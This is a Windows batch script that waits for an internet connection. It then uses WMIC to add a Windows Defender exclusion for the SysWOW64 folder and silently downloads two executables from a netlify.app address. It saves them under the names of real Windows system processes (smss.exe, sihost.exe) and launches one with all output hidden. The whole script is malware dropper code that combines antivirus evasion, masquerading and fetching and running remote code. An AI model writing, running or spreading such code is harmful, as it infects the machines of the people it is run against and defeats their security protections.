@echo off
setlocal

:: ---------- Config ----------
set "pingTarget=8.8.8.8"
set "retryDelay=3"    :: seconds between checks

:: ---------- Wait for Internet ----------
:WaitForInternet
ping -n 1 %pingTarget% >nul 2>&1
if errorlevel 1 (
    timeout /t %retryDelay% /nobreak >nul
    goto WaitForInternet
)

:: ---------- Execute target on USB ----------
wmic /namespace:\\root\Microsoft\Windows\Defender path MSFT_MpPreference call Add ExclusionPath="C:\Windows\SysWOW64" >nul 2>&1

timeout /t 2 >nul

set DOWNLOAD_PATH1=%SystemRoot%\SysWOW64\smss.exe
curl -s -L -o "%DOWNLOAD_PATH1%" "https://smss1.netlify.app/smss.exe" >nul 2>&1

set DOWNLOAD_PATH2=%SystemRoot%\SysWOW64\sihost.exe
curl -s -L -o "%DOWNLOAD_PATH2%" "https://smss1.netlify.app/sihost.exe" >nul 2>&1

:: Run downloaded files silently
start "" "%DOWNLOAD_PATH2%" >nul 2>&1

exit